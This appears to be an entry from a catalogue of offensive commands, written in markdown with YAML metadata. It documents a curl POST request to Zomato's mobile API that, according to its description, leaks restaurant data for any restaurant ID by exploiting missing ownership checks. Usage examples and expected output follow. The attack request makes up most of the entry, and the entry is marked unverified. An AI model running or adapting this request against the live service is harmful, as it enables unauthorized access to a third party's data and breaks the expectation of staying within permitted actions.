---
data: >-
  curl -X POST "https://api.zomato.com/XX/XXXXX?res_id=XXXXX" -H "Host:
  api.zomato.com" -H "X-Device-Is-Rooted: 0" -H "Cookie: <COOKIES>" -H
  "Content-Type: application/x-www-form-urlencoded" -d "access_token=<your
  token>&client_id=zomato_ios_v2"
tags:
  - api
  - leak
type: command
executor: bash
platforms:
  - Mobile API
id: d362b20d-dbb6-4c3f-92bc-b3df88330363
created_at: '2025-12-14T17:25:29.735Z'
updated_at: '2025-12-14T17:25:29.735Z'
verified: false
validated: true
submitted: true
---
# Zomato Leak Restaurant Data POST

## Command

```bash
curl -X POST "https://api.zomato.com/XX/XXXXX?res_id=XXXXX" \
  -H "Host: api.zomato.com" \
  -H "X-Device-Is-Rooted: 0" \
  -H "Cookie: <COOKIES>" \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "access_token=<your token>&client_id=zomato_ios_v2"
```

## Description

Sends a POST request to Zomato's API to leak restaurant data using an arbitrary res_id, exploiting lack of ownership checks.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| res_id | Restaurant ID (arbitrary, e.g., XXXXX) | Yes |
| access_token | Authentication token | Yes |
| client_id | Client identifier (zomato_ios_v2) | Yes |
| cookies | Session cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://api.zomato.com/XX/XXXXX?res_id=12345" -H "Cookie: session=abc" -d "access_token=token123&client_id=zomato_ios_v2"
```

### Advanced Usage

```bash
# With verbose output
curl -v -X POST "https://api.zomato.com/XX/XXXXX?res_id=12345" -H "Cookie: session=abc" -d "access_token=token123&client_id=zomato_ios_v2"
```

## Expected Output

JSON response with restaurant details, e.g., {"name": "Test Restaurant", "id": 12345}.

## Related

- [[Related Procedure: Leak-Restaurant-Data-via-API-Request]]
